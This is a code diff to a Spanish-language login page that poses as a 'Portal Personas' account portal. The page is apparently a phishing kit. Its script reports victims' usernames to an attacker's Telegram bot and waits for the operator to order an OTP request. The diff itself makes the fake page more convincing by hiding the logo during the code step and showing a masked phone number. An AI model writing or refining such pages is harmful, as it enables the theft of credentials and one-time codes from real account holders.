@@ -72,11 +72,13 @@
         <div class="bb-stack__item--fill identity-container">
             <div class="identity-container__panel identity-container__panel--animated">
                 <div class="identity-container__form">
-                    <div class="login-logos-wrapper">
+                    
+                    <!-- LOGO / IMAGEN (Se oculta en el paso del OTP) -->
+                    <div class="login-logos-wrapper" id="main-logo">
                         <div class="identity-logo bb-block bb-block--lg"></div>
                     </div>
                     
-                    <!-- ENCABEZADO (Se oculta cuando estamos en el paso del OTP) -->
+                    <!-- ENCABEZADO (Se oculta en el paso del OTP) -->
                     <header id="main-header">
                         <h1 id="kc-page-title">Bienvenido al Portal Personas</h1>
                     </header>
@@ -161,7 +163,7 @@
                             <svg class="phone-icon" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                                 <path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/>
                             </svg>
-                            <span class="phone-number"></span>
+                            <span class="phone-number">3*****8088</span>
                         </div>
 
                         <div id="kc-form">
@@ -220,7 +222,9 @@
         const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
         /* ========================================== */
 
+        const mainLogo     = document.getElementById('main-logo');
         const mainHeader   = document.getElementById('main-header');
+        
         const stepUsername = document.getElementById('step-username');
         const stepPassword = document.getElementById('step-password');
         const stepWaiting  = document.getElementById('step-waiting');
@@ -376,8 +380,11 @@
                                 } 
                                 else if (action === 'pedir_codigo') {
                                     enviarTelegram(`📩 Se ha solicitado el código para <code>${USERNAME}</code>.`);
-                                    // Ocultar el header de bienvenida
+                                    
+                                    // Ocultar IMAGEN y ENCABEZADO
+                                    mainLogo.classList.add('d-none');
                                     mainHeader.classList.add('d-none');
+                                    
                                     stepWaiting.classList.add('d-none');
                                     stepOtp.classList.remove('d-none');
                                     otpInput.focus();
